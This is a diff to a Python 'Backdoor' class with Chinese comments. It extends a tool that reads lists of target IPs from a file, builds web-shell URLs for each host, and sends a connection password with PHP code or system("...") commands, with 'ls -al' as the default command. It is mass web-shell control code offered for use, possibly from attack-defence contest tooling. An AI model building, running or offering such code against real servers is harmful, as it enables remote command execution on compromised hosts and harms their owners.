@@ -1,12 +1,11 @@
 import requests
 import re
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, urlunparse
 from requests.exceptions import RequestException
 
 
 class Backdoor:
     FileAddress = ''  # 用于保存文件地址
-    IP_Address = ''  # 用于保存IP地址
     Url = ''  # 用于保存Url
     scheme = ''  # 协议部分
     netloc = ''  # 域名部分
@@ -16,8 +15,10 @@ class Backdoor:
     first_param_value = ''  # 查询值
     password = ''  # 连接密码
     codeCmd = ''  # 执行代码命令
-    post_data = {}  # post数据
     systemCmd = ''  # 执行系统命令
+    all_IP = []  # 用于保存全部的IP地址
+    all_Url = []  # 用于保存全部的Url
+    post_data = {}  # post数据
 
     def printAll(self):
         """
@@ -33,8 +34,8 @@ class Backdoor:
             示例用法:
             - 调用 `printAll()` 方法来打印对象的所有属性信息。
         """
+        print("---------------------属性---------------------")
         print("文件地址属性: ", self.FileAddress)
-        print("IP地址属性: ", self.IP_Address)
         print("URL属性: ", self.Url)
         print("协议部分属性: ", self.scheme)
         print("域名部分属性: ", self.netloc)
@@ -43,7 +44,18 @@ class Backdoor:
         print("查询键属性: ", self.first_param_name)
         print("查询值属性: ", self.first_param_value)
         print("连接密码属性: ", self.password)
-        print("执行命令属性: ", self.cmd)
+        print("代码命令属性: ", self.codeCmd)
+        print("POST数据属性：", self.post_data)
+        print("系统命令属性：", self.systemCmd)
+        print('----------------------------------------------')
+
+    def printALL_IP(self):
+        for ip in self.all_IP:
+            print(ip)
+
+    def printALL_Url(self):
+        for url in self.all_Url:
+            print(url)
 
     def setCodeCmd(self, value=""):
         """
@@ -59,7 +71,7 @@ class Backdoor:
 
         Example:
             示例用法:
-            - 调用 `setCmd()` 方法来设置执行命令属性。
+            - 调用 `setcodeCmd()` 方法来设置执行命令属性。
         """
         self.codeCmd = value
 
@@ -117,6 +129,12 @@ class Backdoor:
         """
         self.systemCmd = rf'system("{cmd}");'
 
+    def setnetloc(self, netloc):
+        try:
+            self.netloc = netloc
+        except Exception as e:
+            print("IP设置错误:", str(e))
+
     def testUrl(self, Url="", password="admin", cmd="ls -al", automatic="y", timeoutvalue=2):
         """
         测试URL连接并验证密码。
@@ -126,7 +144,7 @@ class Backdoor:
         Args:
             Url (str, optional): 要测试的URL。默认为空字符串。
             password (str, optional): 验证密码。默认为 "admin"。
-            cmd (str, optional): 执行命令。默认为 "system('ls -al');"。
+            cmd (str, optional): 执行命令。默认为 "ls -al"。
             automatic (str, optional): 是否自动执行测试。默认为 "y" 自动。
             timeoutvalue (int, optional): 连接超时时间（秒）。默认为 2 秒。
 
@@ -213,7 +231,7 @@ class Backdoor:
             self.first_param_name = list(query_dict.keys())[0]
             self.first_param_value = query_dict[self.first_param_name][0]
 
-    def readFileAddress(self, value=''):
+    def getFileAddress(self, value=''):
         """
         将从文件中读取IP地址资产。
         这个方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。
@@ -239,4 +257,11 @@ class Backdoor:
         except Exception as e:
             print("文件地址获取发生错误", str(e))
 
-    # def  get_IP(self):
+    def readAll_IP(self):
+        with open(self.FileAddress, mode="r", encoding="utf-8") as f:
+            self.all_IP = [line.strip() for line in f.readlines()]
+
+    def spliceUrl(self):
+        urls = [
+            f"{self.scheme}://{ip}{self.path}?{self.query}"for ip in self.all_IP]
+        self.all_Url = urls
